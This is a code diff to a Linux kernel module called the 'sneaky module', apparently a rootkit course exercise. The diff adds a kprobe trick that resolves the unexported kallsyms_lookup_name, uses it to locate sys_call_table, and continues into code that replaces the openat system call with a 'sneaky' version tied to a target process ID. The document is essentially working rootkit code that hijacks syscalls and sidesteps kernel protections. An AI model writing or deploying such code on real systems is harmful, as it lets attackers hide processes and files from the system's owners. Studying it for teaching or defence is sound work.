@@ -6,6 +6,7 @@
 #include <linux/highmem.h>     // for changing page permissions
 #include <asm/unistd.h>        // for system call constants
 #include <linux/kallsyms.h>
+#include <linux/kprobes.h>
 #include <linux/uaccess.h>
 #include <linux/string.h>
 #include <linux/moduleparam.h>
@@ -18,6 +19,7 @@
 
 //This is a pointer to the system call table
 static unsigned long *sys_call_table;
+static unsigned long (*kallsyms_lookup_name_p)(const char *name);
 static int sneaky_pid;
 
 module_param(sneaky_pid, int, 0);
@@ -45,6 +47,29 @@ int disable_page_rw(void *ptr){
 //    should expect it find its arguments on the stack (not in registers).
 asmlinkage int (*original_openat)(struct pt_regs *);
 
+static int resolve_kallsyms_lookup_name(void)
+{
+  struct kprobe kp = {
+      .symbol_name = "kallsyms_lookup_name",
+  };
+  int ret = register_kprobe(&kp);
+
+  if (ret < 0) {
+    printk(KERN_ERR "register_kprobe failed: %d\n", ret);
+    return ret;
+  }
+
+  kallsyms_lookup_name_p = (void *)kp.addr;
+  unregister_kprobe(&kp);
+
+  if (!kallsyms_lookup_name_p) {
+    printk(KERN_ERR "failed to resolve kallsyms_lookup_name\n");
+    return -ENOENT;
+  }
+
+  return 0;
+}
+
 // Define your new sneaky version of the 'openat' syscall
 asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
 {
@@ -69,13 +94,24 @@ asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
 // The code that gets executed when the module is loaded
 static int initialize_sneaky_module(void)
 {
+  int ret;
+
   // See /var/log/syslog or use `dmesg` for kernel print output
   printk(KERN_INFO "Sneaky module being loaded.\n");
   printk(KERN_INFO "Sneaky module pid = %d\n", sneaky_pid);
 
+  ret = resolve_kallsyms_lookup_name();
+  if (ret < 0) {
+    return ret;
+  }
+
   // Lookup the address for this symbol. Returns 0 if not found.
   // This address will change after rebooting due to protection
-  sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");
+  sys_call_table = (unsigned long *)kallsyms_lookup_name_p("sys_call_table");
+  if (!sys_call_table) {
+    printk(KERN_ERR "failed to resolve sys_call_table\n");
+    return -ENOENT;
+  }
 
   // This is the magic! Save away the original 'openat' system call
   // function address. Then overwrite its address in the system call
